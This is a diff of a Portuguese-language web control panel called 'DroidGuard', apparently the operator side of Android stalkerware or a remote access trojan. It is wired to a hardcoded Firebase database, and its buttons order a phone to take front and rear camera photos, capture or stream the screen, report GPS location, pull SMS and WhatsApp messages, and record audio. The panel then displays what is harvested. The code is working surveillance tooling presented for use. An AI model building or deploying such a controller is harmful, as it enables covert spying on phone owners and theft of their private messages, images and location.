@@ -1,89 +1,392 @@
-
 <!DOCTYPE html>
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DroidGuard Pro - Engenharia</title>
+    <title>DroidGuard | Painel de Controle</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <style>
-        body { font-family: sans-serif; background: #080c0e; color: white; margin: 0; padding: 10px; }
-        .section { background: #16262c; border: 1px solid #333; border-radius: 8px; padding: 15px; margin-bottom: 10px; }
-        h3 { margin-top: 0; color: #2f8e8b; border-bottom: 1px solid #222; padding-bottom: 5px; }
-        
-        /* Controles */
-        input, button { width: 100%; padding: 12px; margin: 5px 0; border-radius: 4px; border: none; }
-        input { background: #000; color: #0f0; border: 1px solid #2f8e8b; }
-        button { cursor: pointer; font-weight: bold; background: #2f8e8b; color: white; }
-        .btn-red { background: #900; }
-        
-        /* Dados */
-        #map { height: 200px; background: #000; border-radius: 5px; }
-        img { width: 100%; border-radius: 5px; background: #000; margin-top: 5px; }
-        .stats { display: flex; justify-content: space-between; font-weight: bold; font-size: 14px; background: #000; padding: 10px; border-radius: 5px; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0a0c0f;
+            font-family: 'Segoe UI', 'Poppins', sans-serif;
+            color: #eef2ff;
+            padding: 20px;
+        }
+
+        /* Header */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            margin-bottom: 25px;
+            border-bottom: 1px solid #1f2a3a;
+            padding-bottom: 15px;
+        }
+
+        .logo h1 {
+            font-size: 1.7rem;
+            background: linear-gradient(135deg, #2f8e8b, #4fd1c5);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .logo p {
+            font-size: 0.8rem;
+            color: #7f8c8d;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+
+        .nav-links a {
+            color: #cbd5e6;
+            text-decoration: none;
+            font-weight: 500;
+            transition: 0.3s;
+        }
+
+        .nav-links a:hover {
+            color: #4fd1c5;
+        }
+
+        /* Grid principal */
+        .dashboard {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
+            gap: 22px;
+            margin-top: 20px;
+        }
+
+        .card {
+            background: #0f1219;
+            border-radius: 24px;
+            padding: 18px;
+            border: 1px solid #1e2a36;
+            backdrop-filter: blur(2px);
+            transition: 0.2s;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+        }
+
+        .card h3 {
+            font-size: 1.3rem;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border-left: 4px solid #2f8e8b;
+            padding-left: 12px;
+        }
+
+        /* Câmeras lado a lado */
+        .cam-dual {
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+        }
+
+        .cam-box {
+            flex: 1;
+            text-align: center;
+        }
+
+        .cam-box img {
+            width: 100%;
+            max-height: 200px;
+            object-fit: cover;
+            border-radius: 16px;
+            border: 1px solid #2f8e8b;
+            background: #000;
+        }
+
+        .cam-placeholder {
+            background: #1a1f2a;
+            padding: 40px;
+            border-radius: 16px;
+            color: #5a6e7c;
+            font-size: 0.9rem;
+        }
+
+        /* Tela ao vivo */
+        .screen-live {
+            background: #000000aa;
+            border-radius: 16px;
+            text-align: center;
+            padding: 15px;
+        }
+
+        .screen-live img {
+            width: 100%;
+            border-radius: 12px;
+            background: #0a0c10;
+            min-height: 180px;
+        }
+
+        /* Botões de comando */
+        .cmd-buttons {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            margin-top: 15px;
+        }
+
+        .cmd-btn {
+            background: #1e2a36;
+            border: none;
+            padding: 10px 16px;
+            border-radius: 40px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.2s;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 0.85rem;
+        }
+
+        .cmd-btn i {
+            font-size: 1rem;
+        }
+
+        .cmd-btn:hover {
+            background: #2f8e8b;
+            transform: scale(1.02);
+        }
+
+        .danger-btn {
+            background: #9b2c2c;
+        }
+        .danger-btn:hover {
+            background: #c0392b;
+        }
+
+        /* Lista de mensagens */
+        .msg-list {
+            list-style: none;
+            margin-top: 10px;
+        }
+        .msg-list li {
+            background: #0b0e14;
+            margin: 8px 0;
+            padding: 10px;
+            border-radius: 14px;
+            border-left: 3px solid #2f8e8b;
+            font-size: 0.85rem;
+        }
+        .msg-time {
+            font-size: 0.7rem;
+            color: #7e8c8f;
+            display: block;
+        }
+
+        .badge {
+            background: #2f8e8b20;
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-size: 0.75rem;
+        }
+
+        @media (max-width: 700px) {
+            .header {
+                flex-direction: column;
+                gap: 12px;
+            }
+        }
     </style>
 </head>
 <body>
 
-    <h3>🛡️ DROIDGUARD - MODO FUNCIONAL</h3>
-
-    <div class="section">
-        <div class="stats">
-            <span>🔋 BATERIA: <span id="bat">--</span>%</span>
-            <span>📍 GPS: <span id="gps-status">OFF</span></span>
-        </div>
-        <div id="map"></div>
+<div class="header">
+    <div class="logo">
+        <h1><i class="fas fa-shield-alt"></i> DroidGuard</h1>
+        <p>Monitoramento avançado · Comando remoto</p>
     </div>
-
-    <div class="section">
-        <h3>📸 ÚLTIMA CAPTURA</h3>
-        <img id="foto" src="">
+    <div class="nav-links">
+        <a href="#"><i class="fas fa-tachometer-alt"></i> Início</a>
+        <a href="#"><i class="fas fa-mobile-alt"></i> Dispositivos</a>
+        <a href="#"><i class="fas fa-map-marker-alt"></i> Mapas</a>
+        <a href="#"><i class="fas fa-history"></i> Histórico</a>
+        <a href="#"><i class="fas fa-folder"></i> Arquivos</a>
     </div>
+</div>
 
-    <div class="section">
-        <h3>🕹️ COMANDOS REMOTOS</h3>
-        <input type="text" id="voz-txt" placeholder="Texto para o celular falar...">
-        <button onclick="enviar('speak', document.getElementById('voz-txt').value)">🗣️ FALAR TEXTO</button>
-        <button onclick="enviar('vibrate')">📳 VIBRAR CELULAR</button>
-        <button class="btn-red" onclick="enviar('record', '10')">🎙️ GRAVAR ÁUDIO (10s)</button>
-    </div>
-
-    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+<div class="dashboard">
     
-    <script>
-        firebase.initializeApp({ databaseURL: "https://droidguard-10597-default-rtdb.firebaseio.com/" });
-        const db = firebase.database();
+    <!-- Câmera frontal + traseira -->
+    <div class="card">
+        <h3><i class="fas fa-camera"></i> Câmera Frontal</h3>
+        <div class="cam-box">
+            <img id="camFront" src="" alt="Frontal">
+        </div>
+        <h3 style="margin-top: 15px;"><i class="fas fa-camera-retro"></i> Câmera Traseira</h3>
+        <div class="cam-box">
+            <img id="camRear" src="" alt="Traseira">
+            <div class="cmd-buttons">
+                <button class="cmd-btn" onclick="sendCmd('photo_front')"><i class="fas fa-camera"></i> Tirar Foto (Frontal)</button>
+                <button class="cmd-btn" onclick="sendCmd('photo_rear')"><i class="fas fa-camera"></i> Foto (Traseira)</button>
+            </div>
+        </div>
+    </div>
 
-        // Enviar Comando
-        function enviar(action, val = "") {
-            db.ref('commands').set({ action: action, value: val });
-            console.log("Comando enviado: " + action);
-        }
+    <!-- Visualização de tela ao vivo -->
+    <div class="card">
+        <h3><i class="fas fa-desktop"></i> Visualização de Tela ao Vivo</h3>
+        <div class="screen-live">
+            <img id="screenLive" src="" alt="Screen capture">
+            <div class="cmd-buttons">
+                <button class="cmd-btn" onclick="sendCmd('screenshot')"><i class="fas fa-image"></i> Capturar Tela</button>
+                <button class="cmd-btn" onclick="sendCmd('start_stream')"><i class="fas fa-play-circle"></i> Iniciar Stream (5s)</button>
+            </div>
+        </div>
+    </div>
 
-        // Mapa
-        const map = L.map('map').setView([0, 0], 2);
-        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
-        let marker = L.circleMarker([0, 0], {color: 'cyan', radius: 8}).addTo(map);
+    <!-- Localização GPS recente + mapa estático -->
+    <div class="card">
+        <h3><i class="fas fa-map-pin"></i> Localização GPS Recente</h3>
+        <div id="gpsInfo" style="margin-bottom: 8px;">
+            <span class="badge"><i class="fas fa-sync-alt"></i> Aguardando dados...</span>
+        </div>
+        <iframe id="staticMap" width="100%" height="200" style="border-radius: 16px; border:0;" loading="lazy" 
+            src="https://maps.google.com/maps?q=-23.5505,-46.6333&z=12&output=embed"></iframe>
+        <div class="cmd-buttons">
+            <button class="cmd-btn" onclick="sendCmd('get_location')"><i class="fas fa-location-dot"></i> Atualizar GPS</button>
+        </div>
+    </div>
 
-        // Receber Dados
-        db.ref('device_status').on('value', (s) => {
-            const d = s.val();
-            if(d) {
-                document.getElementById('bat').innerText = d.battery_level || '--';
-                if(d.lat) {
-                    const pos = [d.lat, d.lon];
-                    marker.setLatLng(pos);
-                    map.setView(pos, 15);
-                    document.getElementById('gps-status').innerText = "ON";
-                }
-                if(d.photo) {
-                    document.getElementById('foto').src = "data:image/jpeg;base64," + d.photo;
-                }
-            }
+    <!-- Últimas Mensagens (SMS/WhatsApp mock + comandos) -->
+    <div class="card">
+        <h3><i class="fas fa-comment-dots"></i> Últimas Mensagens</h3>
+        <ul class="msg-list" id="messageList">
+            <li><span class="msg-time">Aman · 13h atrás</span><br>Peter: últimas mensagens estão à caminho...</li>
+            <li><span class="msg-time">Elka Maria · 12h atrás</span><br>Percebi suas mensagens, sem depoimento ainda!</li>
+            <li><span class="msg-time">Alra · 13h atrás</span><br>Mensagem tensa? Transmita autorização?</li>
+            <li><span class="msg-time">Aliva Santo · 17h atrás</span><br>Deixa eu ver a última mensagem certa</li>
+        </ul>
+        <div class="cmd-buttons">
+            <button class="cmd-btn" onclick="sendCmd('fetch_sms')"><i class="fas fa-envelope"></i> Buscar SMS</button>
+            <button class="cmd-btn" onclick="sendCmd('fetch_whatsapp')"><i class="fab fa-whatsapp"></i> Buscar WhatsApp</button>
+        </div>
+    </div>
+
+    <!-- Comandos rápidos (voz, vibrar, gravar) -->
+    <div class="card">
+        <h3><i class="fas fa-terminal"></i> Comandos Remotos</h3>
+        <div class="cmd-buttons">
+            <button class="cmd-btn" onclick="sendCmd('vibrate')"><i class="fas fa-mobile"></i> Vibrar</button>
+            <button class="cmd-btn" onclick="sendCmd('record', '15')"><i class="fas fa-microphone"></i> Gravar Áudio (15s)</button>
+            <button class="cmd-btn" onclick="openVoiceModal()"><i class="fas fa-volume-up"></i> Falar no dispositivo</button>
+            <button class="cmd-btn danger-btn" onclick="sendCmd('alert', 'ALERTA')"><i class="fas fa-exclamation-triangle"></i> Alerta Remoto</button>
+        </div>
+        <div style="margin-top: 15px;">
+            <label>🔋 Bateria: <strong id="batteryLevel">--</strong>%</label>
+            <progress id="batteryBar" value="0" max="100" style="width:100%; height:12px; border-radius:20px;"></progress>
+        </div>
+    </div>
+</div>
+
+<!-- Modal para comando de voz -->
+<div id="voiceModal" style="display:none; position:fixed; background:#0a0c10dd; backdrop-filter:blur(6px); top:0; left:0; width:100%; height:100%; justify-content:center; align-items:center; z-index:1000;">
+    <div style="background:#141c24; padding:30px; border-radius:32px; width:90%; max-width:380px;">
+        <h3>🗣️ Falar no Celular</h3>
+        <input type="text" id="voiceText" placeholder="Digite a mensagem..." style="width:100%; padding:12px; margin:15px 0; border-radius:24px; border:none;">
+        <div style="display:flex; gap:12px;">
+            <button onclick="sendCmd('speak', document.getElementById('voiceText').value); closeVoiceModal();" class="cmd-btn" style="flex:1">Enviar</button>
+            <button onclick="closeVoiceModal();" class="cmd-btn" style="background:#3a3f4b;">Cancelar</button>
+        </div>
+    </div>
+</div>
+
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+<script>
+    // Configuração do Firebase (igual ao seu monitor.py)
+    const firebaseConfig = {
+        databaseURL: "https://droidguard-10597-default-rtdb.firebaseio.com/"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    // Função para enviar comandos
+    function sendCmd(action, value = "") {
+        db.ref('commands').set({
+            action: action,
+            value: value,
+            timestamp: Date.now()
         });
-    </script>
+        console.log(`Comando enviado: ${action} / ${value}`);
+        // Feedback visual simples
+        const btn = event?.target;
+        if(btn && btn.classList) {
+            const original = btn.innerText;
+            btn.innerText = "✅ Enviado!";
+            setTimeout(() => btn.innerText = original, 1000);
+        } else {
+            alert(`Comando "${action}" enviado!`);
+        }
+    }
+
+    // Modal de voz
+    function openVoiceModal() {
+        document.getElementById('voiceModal').style.display = 'flex';
+    }
+    function closeVoiceModal() {
+        document.getElementById('voiceModal').style.display = 'none';
+    }
+
+    // Atualiza dashboard com dados vindos do dispositivo (device_status)
+    db.ref('device_status').on('value', (snapshot) => {
+        const data = snapshot.val();
+        if(!data) return;
+
+        // Fotos das câmeras (base64)
+        if(data.photo_front) {
+            document.getElementById('camFront').src = "data:image/jpeg;base64," + data.photo_front;
+        }
+        if(data.photo_rear) {
+            document.getElementById('camRear').src = "data:image/jpeg;base64," + data.photo_rear;
+        }
+        if(data.screenshot) {
+            document.getElementById('screenLive').src = "data:image/jpeg;base64," + data.screenshot;
+        }
+        // Bateria
+        if(data.battery_level !== undefined) {
+            const bat = data.battery_level;
+            document.getElementById('batteryLevel').innerText = bat;
+            document.getElementById('batteryBar').value = bat;
+        }
+        // Localização
+        if(data.latitude && data.longitude) {
+            const lat = data.latitude;
+            const lng = data.longitude;
+            const mapUrl = `https://maps.google.com/maps?q=${lat},${lng}&z=14&output=embed`;
+            document.getElementById('staticMap').src = mapUrl;
+            document.getElementById('gpsInfo').innerHTML = `<span class="badge"><i class="fas fa-map-marker-alt"></i> Lat: ${lat} | Lng: ${lng}</span>`;
+        }
+        // Mensagens (se vier array)
+        if(data.messages && Array.isArray(data.messages)) {
+            const msgContainer = document.getElementById('messageList');
+            msgContainer.innerHTML = data.messages.map(msg => 
+                `<li><span class="msg-time">${msg.time || 'agora'}</span><br>${msg.sender || '?'}: ${msg.text}</li>`
+            ).join('');
+        }
+    });
+
+    // Simulação de boas-vindas: comando inicial para pedir status
+    window.onload = () => {
+        console.log("DroidGuard Painel Ativo");
+        sendCmd('status_request');
+    };
+</script>
 </body>
 </html>
